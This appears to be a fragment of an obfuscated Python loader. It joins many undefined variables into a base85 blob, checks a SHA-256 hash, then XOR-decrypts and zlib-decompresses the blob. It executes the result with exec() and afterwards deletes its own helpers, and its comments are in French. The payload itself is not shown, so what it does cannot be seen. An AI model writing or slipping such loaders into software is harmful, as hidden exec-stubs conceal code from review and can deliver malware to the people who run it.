_pmbDAdpwXIQjGr = __import__('base64').b85decode(_cn73lPevMoDDMM + _czL1SfP8HwGf5c + _cfFePnscugjX9t + _ctg026emBqNo1M + _cldJbAUomzKDAZ + _cnhXHxX70n_z0A + _c_NHWAzmH2WwdM + _cd4gMiIEJPRBu1 + _crDyFgjGonrMTd + _ctIaJQIA1uKq0l + _cvpaq0zNlpmVCw + _caMypfawvM3_sp + _ccqqdD4GO07fWr + _c_F36S3bA_69hF + _c_xsQK3YDdlh7J + _c_f4iRZ9N_x3kl + _cgwJwlv2vjqUXm + _cv2FKywEGH4WEw + _cn7G5jrzvY_LgD + _cjkQs_NcM6jhbt + _cw5_0rWfgH8HRj + _czqcQXPmsvcrZs + _csTighTQztmKta + _cw4v3Zk4JtsIWx + _czsqLlmuTRLlzD + _cl28EsbKE0_u15 + _cn2O9avIv0PkGI + _ciz1xQRuOg0e2h + _cqYLZHs9zt5vAq + _cc7zYkzQVmPkrx + _cu2dnYWoa5PI6Q + _clUj_gKnuyWvvU + _cxpPhVtoEbYSh2 + _cfisrfpp6aIG3t + _cdl2_o058euNa3 + _cg79DAXgTlXv8s + _ch5Dc0lDGC2U5x + _cwuchEOGpJrEdu + _csAOXUR2HO1ytk + _c_HimUhiuOn5Dx + _ctyUb1843CmvVs + _cs_CFIzWNaSol3 + _cdDsBxv856kfbZ + _cs40OS4jRnEZxW + _coFHwklRvfDICH + _cdv4iUFlXgExPF + _cb0FoXJWMlTKWO + _cogffG_Cs2qtNE + _cwMWWdhxVoU9a0 + _csrieU6RLKWXRY + _cbD9ZzU6rzzYY3 + _cleSF79FuCBUjG + _cpm1Vw1TfMMAx8 + _caRALkCGCtOSpS + _crq4cfVYpmwavx + _cnDareXjiHyNou + _cxd1YyYdHXmAKJ + _clRJGsUjC5_XiE + _ct1TMYcCxVWqJH + _cm4gDg1fOBcRb9 + _cxRe6aV6V20YF5 + _cfutQaYISLReR1 + _cdbtpEW_f6z2KU + _cod8jKX7tTgRQZ + _creGQ_mWMDLXQs + _cyd3TDqPjwu81K + _c_pApBtsJJ1mne + _crOtuOgpLsUy8o + _cvh2Bc7xcbEFrU + _cc_ggU9bsc0U7E + _cgxoQteB3aP13d + _cr0pAsjL8H_A14 + _cvblZ0ImKTiGrn + _cfA_KWVYm9iAhO + _cyK8xSuv0qNTL6 + _curpPfitcQvJld + _chmNUViQAwAdsz + _cwISGfiR3HL5C6 + _co35cK9xjfMEhf + _cobgx5MLWMhgJU + _cuP8G6wrFTPoMC + _cedoP5gS3n8CMx + _cdlZRgm96CP34S + _ccnfxcg7SUUPJf + _cmjdpAUEcVa2JN + _coxMYNzyJUHeWh + _ckiyAtu4rRQuIh + _czS1zEPLWxz1O3 + _c_5KXh4AGfmvYG + _czqUFPMb0kFEvP + _cpWX_XTKk9hanV + _cqveVL8EnrOgxI + _cabo9D7pXheEGx + _caY17zmVbi_Rbe + _cbVdwZyx4A5OKe + _cuBspLwxAZEnqU + _ch_ENz2HDkj6kf + _cdmtMPSjacS62y + _c_6vx84ztHwBAZ + _cvFijxoYqaaaL4 + _cnZctq6svlBzIw + _cuAzi5miSgJ9lb + _cu29QyBbqeyq_o + _cdRu1w8hdrEmJa + _clCnHBMi2PzLJW + _ctgWH_IeTB958a + _ci89XvUlVzFETW + _cm6uscOxTbHNcw + _czhYKnrDvpkWGa + _cjht9hP69bX5Ph + _csQFhmeMV_EX5q + _cbia72ts2Dayf6 + _cbXcCu9qTcnCJi + _ccCuOOjac2XSiM + _ch64KVdmtwRvwT + _cdnMpWmERmbi5J + _cj9WBosLaY6CtG + _cklioi7S4YiTTE + _clwv1FjIQn4hSN + _ckl9PQY1F5yq1B + _ccL2OB72gllGUk + _caP0eBMkIINdEt + _csMIUbv505qzT_ + _cb7YlBAmDXdIUG + _cj9AjCEKwdtmIh + _cmrwk2op3tCwKh + _clYYswBD3MRuss + _cwEeP8Fz84gmHz + _czw41f25bx9KDZ + _cwF5EGeG2sfYGc + _cvXoEQRJK8I1BF + _ckefG259ocHW10 + _csrgiSG92MKLHU + _cs5O_RqOpup9IJ + _cpgmbkOnD33oGl + _cwPAxJCwqJzdr_ + _cfSateMVWGV0wP + _ca2VF4mdB78ZEX + _ccZam2sMMzCWXR + _cmWkpxSi_E9Yc7 + _ciU0jkzDuy4hdu + _cu13d8zSYIU5a_ + _cemmbfjh7Vvf4v + _cyreCx2pt7zIg_ + _crdzoBHKypwtt4 + _cw5nERcYnXKJxc + _cqMQ9V21V5aAXI + _cpXUtCcVoFYNf5 + _cltiFJ_Z91atoO + _ceVmuitBNXnFre + _cexSASzM26dICS + _cz9z_mz2Fq8F3m + _cj1jkMkGzsMWYL + _cvJz3vKDrkicpl + _cymVxVUwPZ61cq + _cqZVk3yoejUA4G + _cc2rua7QmROt_F + _ciNL3IcZaiIKrc + _cxIyODyvFSiSQw + _cdYRlTfJfeU5Pk)
if __import__('hashlib').sha256(_pmbDAdpwXIQjGr).hexdigest() != '1ede78ee74518b6f6b3a911e362066e5267732bd018778a2f24ee66ee5547d10':
    __import__('sys').exit(1)
_xc2xDXxFgqWPBR = bytes([155, 91, 80, 45, 181, 189, 129, 20, 79, 12, 44])
_fkb3SzMlH_NizYg = bytes([110, 184, 173, 124, 255, 216, 133, 196, 125, 229, 70])

def _fxaCKFshyuqtYQF(_brjI8aREIUimVR, _kgahexlXMS9ogH):
    return bytes(_brjI8aREIUimVR[_iac2gQnSy6BxV0] ^ _kgahexlXMS9ogH[_iac2gQnSy6BxV0 % len(_kgahexlXMS9ogH)] for _iac2gQnSy6BxV0 in range(len(_brjI8aREIUimVR)))

def _fd_opatVuBq1ptu(_teOe2sOPgmdTgf):
    import zlib
    return zlib.decompress(_teOe2sOPgmdTgf) # Un seul niveau de zlib ici pour simplifier

def _fefbhi6xaasOwBa():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xsGOUkoaDH2ind = _fxaCKFshyuqtYQF(_pmbDAdpwXIQjGr, _xc2xDXxFgqWPBR)
    # 2. Décompression Zlib
    _dww2CF4w6aRTYL = _fd_opatVuBq1ptu(_xsGOUkoaDH2ind)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dww2CF4w6aRTYL.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nsAL84q0uQWuuD = _main.__dict__
    _nsAL84q0uQWuuD.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nsAL84q0uQWuuD)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fefbhi6xaasOwBa()
try:
    del _fxaCKFshyuqtYQF, _fd_opatVuBq1ptu, _fefbhi6xaasOwBa
    del _pmbDAdpwXIQjGr, _xc2xDXxFgqWPBR, _fkb3SzMlH_NizYg
except:
    pass
